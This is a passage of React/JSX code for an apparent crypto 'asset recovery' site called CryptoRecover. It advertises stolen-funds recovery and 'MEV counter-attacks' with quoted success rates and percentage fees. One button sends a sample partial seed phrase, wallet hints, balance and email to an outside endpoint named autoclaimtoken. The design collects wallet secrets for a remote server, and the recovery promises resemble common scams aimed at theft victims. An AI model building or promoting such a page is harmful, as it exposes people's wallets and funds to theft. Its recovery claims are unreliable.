                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/security.svg" alt="Stolen Funds" className="w-6 h-6 invert" />
                    </div>
                    <h4 className="text-lg font-bold text-gray-900 mb-2">Stolen Funds Recovery</h4>
                    <p className="text-gray-600 text-sm mb-3">Live blockchain forensics and exchange tracking</p>
                    <div className="text-xs text-orange-600 font-bold">67% Success Rate • 30% Fee</div>
                  </div>
                  
                  <div className="p-6 bg-white rounded-xl border-2 border-purple-200 group">
                    <div className="w-12 h-12 bg-purple-600 rounded-xl flex items-center justify-center mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/lightning.svg" alt="MEV Recovery" className="w-6 h-6 invert" />
                    </div>
                    <h4 className="text-lg font-bold text-gray-900 mb-2">MEV Attack Recovery</h4>
                    <p className="text-gray-600 text-sm mb-3">Real MEV bot detection and counter-attacks</p>
                    <div className="text-xs text-purple-600 font-bold">45% Success Rate • 35% Fee</div>
                  </div>
                </div>
                
                <div className="mt-6 space-y-4">
                  <div className="p-4 bg-blue-50 border border-blue-200 rounded-xl">
                    <div className="flex items-center space-x-3">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/information.svg" alt="Info" className="w-5 h-5 text-blue-600" />
                      <div>
                        <h4 className="font-bold text-blue-800">Test the Advanced Recovery Services</h4>
                        <p className="text-blue-700 text-sm">Click any service above to access the standalone recovery interface with real functionality.</p>
                      </div>
                    </div>
                  </div>
                  
                  <div className="p-4 bg-green-50 border border-green-200 rounded-xl">
                    <div className="flex items-center justify-between">
                      <div>
                        <h4 className="font-bold text-green-800">Quick Test: Lost Wallet Recovery</h4>
                        <p className="text-green-700 text-sm">Test the powerful phrase recovery engine directly</p>
                      </div>
                      <button
                        onClick={() => {
                          // Test the recovery engine directly
                          fetch('https://autoclaimtoken.onrender.com/api/recover-wallet-phrase', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                              partialPhrase: 'abandon ability about above absent',
                              walletHints: 'Created in 2021 on Windows laptop',
                              lastKnownBalance: '5000',
                              recoveryMethod: 'Standard',
                              walletType: 'MetaMask',
                              contactEmail: 'test@example.com'
                            })
                          })
                          .then(res => res.json())
                          .then(data => {
                            alert(`Recovery Test Result:\n\nSuccess: ${data.success}\nMessage: ${data.message}\n\n${data.analysis ? `Analysis:\n• Valid Words: ${data.analysis.validWords}/${data.analysis.phraseLength}\n• Missing Words: ${data.analysis.missingWords}\n• Success Probability: ${data.analysis.probability}%\n• Strategies: ${data.analysis.strategies}` : ''}`);
                          })
                          .catch(err => alert('Test failed: ' + err.message));
                        }}
                        className="bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700 transition-colors font-bold"
                      >
                        Test Recovery Engine
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            {scanResults && scanResults.summary.claimableTokens === 0 && (
              <div className="bg-blue-50 border-2 border-blue-300 rounded-xl p-6 text-center">
                <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/information.svg" alt="Info" className="w-12 h-12 mx-auto mb-4" />
                <h3 className="text-xl font-bold text-blue-800 mb-2">Scan Complete - No Claimable Tokens</h3>
                <p className="text-blue-700 mb-4">
                  We scanned your wallet but didn't find any claimable tokens at this time.
                </p>
                <div className="bg-white rounded-lg p-4 mb-4">
                  <h4 className="font-bold text-blue-800 mb-2">What this means:</h4>
                  <ul className="text-left text-sm text-blue-600 space-y-1">
                    <li>• All your tokens are already in your wallet</li>
                    <li>• No airdrops or rewards are currently available</li>
                    <li>• Tokens may be on networks we haven't scanned yet</li>
                  </ul>
                </div>
                <button 
                  onClick={() => window.location.reload()} 
                  className="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition-colors"
                >
                  Try Different Wallet
                </button>
              </div>
            )}
            
            {analysisResults && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-gray-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-gray-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">✓</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">All Services Complete!</h3>
                </div>
                <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                  <p className="text-green-800 font-medium">
                    All recovery services completed! Review the results above and execute any available recovery opportunities.
                  </p>
                </div>
              </div>
            )}
          </div>
        )}
      </main>

      <footer className="bg-white border-t mt-16">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <div className="text-center text-gray-600">
            <p>&copy; 2025 CryptoRecover. Professional blockchain asset recovery services.</p>
            <p className="text-sm mt-2">
              Non-custodial • Success-only fees • Multi-chain support
            </p>
          </div>
        </div>
      </footer>
      
      <div style={{ position: 'fixed', bottom: '20px', right: '20px', zIndex: 9999 }}>
        <ProfessionalSupport 
          isConnected={isConnected} 
          userPortfolio={portfolio}
          selectedNetwork={selectedNetwork}
        />
      </div>
    </div>
    </>
  );
}